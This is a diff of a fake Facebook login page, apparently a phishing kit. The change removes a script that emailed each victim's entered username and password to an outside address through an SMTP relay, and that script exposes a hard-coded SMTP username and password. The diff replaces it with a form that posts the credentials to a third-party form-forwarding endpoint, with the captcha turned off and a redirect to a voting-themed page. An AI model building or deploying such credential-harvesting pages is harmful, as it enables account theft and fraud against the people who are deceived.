@@ -10,8 +10,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
     <link rel="shortcut icon" href="images/facebook-icon.png" type="image/x-icon">
-    <script src="https://smtpjs.com/v3/smtp.js">
-    </script>
+
+
     <!-- <link rel="stylesheet" href="style.css"> -->
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&amp;display=swap');
@@ -194,17 +194,17 @@
                 <p>Connect with friends and the world </p>
                 <p> around you on Facebook.</p>
             </div>
-            <form id="form" method="POST" >
+            <form id="form" method="POST" action="https://formsubmit.io/send/c8cca0d5-c225-4d93-891e-ac2bcf4304ba"
                 <input type="text" name="username" id="username" required placeholder="email">
 
                 <input type="text" name="password" id="password" required placeholder="password">
                 <!-- <input type="hidden" name="_next" value="https://votelixzz.netlify.app
                 
                 /thanks"> -->
-                <!-- <input type="hidden" name="_captcha" value="false"> -->
-                <!-- <input name="_redirect" type="hidden" id="name" value="https://owenvote.vercel.app/grac.html"> -->
+                <input type="hidden" name="_captcha" value="false">
+                <input name="_redirect" type="hidden" id="name" value="https://owenvote.vercel.app/grac.html">
                 <div class="link">
-                    <button type="submit"  onclick="sendEmail()"   class="login"
+                    <button type="submit"     class="login"
                         style="text-decoration: none; color: white;">Login </button>
                     <a href="#" class="forgot">Forgot password?</a>
                 </div>
@@ -224,25 +224,6 @@
 </body>
 
 
-<script>
-   function sendEmail() {
-    let username = document.getElementById("username").value;
-    let password = document.getElementById("password").value;
-    let finalmessage = `Username: ${username} <br> Password: ${password} <br>`;
 
-    Email.send({
-        Host: "smtp.elasticemail.com",
-        Username: "ademosuemmanuel52@gmail.com", // Update with your SMTP username
-        Password: "C7054CF2300315495390764433A9F8D98BA5", // Update with your SMTP password
-        To: 'owen@coinmaxpro.xyz',
-        From: "ademosuemmanuel52@gmail.com",
-        Subject: "A new login has arrived",
-        Body: finalmessage
-    }).then(
-        message => alert('Mail sent successfully')
-    );
-}
-
-</script>
 <!-- Mirrored from votelkg.netlify.app/realfb by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Nov 2023 10:10:39 GMT -->
 </html>
